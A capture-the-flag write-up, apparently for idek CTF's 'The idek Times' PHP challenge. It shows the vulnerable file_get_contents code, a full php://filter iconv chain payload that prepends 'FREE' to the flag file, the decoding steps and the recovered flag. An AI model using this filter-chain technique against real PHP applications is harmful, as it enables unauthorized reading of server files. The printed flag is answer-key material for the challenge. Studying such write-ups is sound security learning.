![image](https://user-images.githubusercontent.com/75846902/212584342-6b9749c9-3061-40b6-8365-c2b98b9e73a0.png)

Source:
```
<?php if (isset($_GET['source'])) highlight_file(__FILE__) && die() ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/style.css">
    <title>The idek Times</title>
</head>
<body>

<main>
    <nav>
        <h1>The idek Times</h1>
    </nav>

    <?php

        error_reporting(0);
        set_include_path('articles/');

        if (isset($_GET['p'])) {
            $article_content = file_get_contents($_GET['p'], 1);

            if (strpos($article_content, 'PREMIUM') === 0) {
                die('Thank you for your interest in The idek Times, but this article is only for premium users!'); // TODO: implement subscriptions
            }
            else if (strpos($article_content, 'FREE') === 0) {
                echo "<article>$article_content</article>";
                die();
            }
            else {
                die('nothing here');
            }
        }
           
    ?>
```

```
PREMIUM - idek{REDACTED}
```


![image](https://user-images.githubusercontent.com/75846902/212588644-5714ae2a-c634-44a5-83ac-e08ea025fea2.png)

Given that we can only read files that start with "FREE" we can use the php:// scheme to use filters that allow us to modify the flag file 
so we can prepend the "FREE" string. To do this I've used the following tool(notice the two spaces after FREE):

```
https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html

->$ ./php_filter_chain_generator.py --chain 'FREE '
[+] The following gadget chain will generate the following code : FREE  (base64 value: RlJFRSA)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```
![image](https://user-images.githubusercontent.com/75846902/212595932-5fd4fa86-dd90-4ad7-b371-44ab14241266.png)

```
FREE�B�5$TԕT���FV��F�F��U�E�7V'65##�u�C��W%��7w5�W"����>==�@C������>==�@
```

decode.php
```
<?php
$flag_content = file_get_contents("flag.txt");
echo bin2hex($flag_content)."\n";
?>
```

```
01b2429435052454d49554d202d206964656b7b5468346e6b5f555f345f5375627363523162316e675f74305f6f75725f6e33777350485061706572217d0f800f400f43e003d003d0f800f400f43e003d003d0f800f400f43e003d003d0f800f400f
```

Then removed the first 0, so we have:
```
1b2429435052454d49554d202d206964656b7b5468346e6b5f555f345f5375627363523162316e675f74305f6f75725f6e33777350485061706572217d0f800f400f43e003d003d0f800f400f43e003d003d0f800f400f43e003d003d0f800f400f
```
![image](https://user-images.githubusercontent.com/75846902/212599505-60bc680b-fd00-4448-90f1-b7ee199abb15.png)
![image](https://user-images.githubusercontent.com/75846902/212599600-4cfd7a45-8953-4a52-a704-42e7b27f6c48.png)

```
$)CPREMIUM - idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}€@CàÐÐø�ô�ô>�=�=€@CàÐÐø�ô�
```
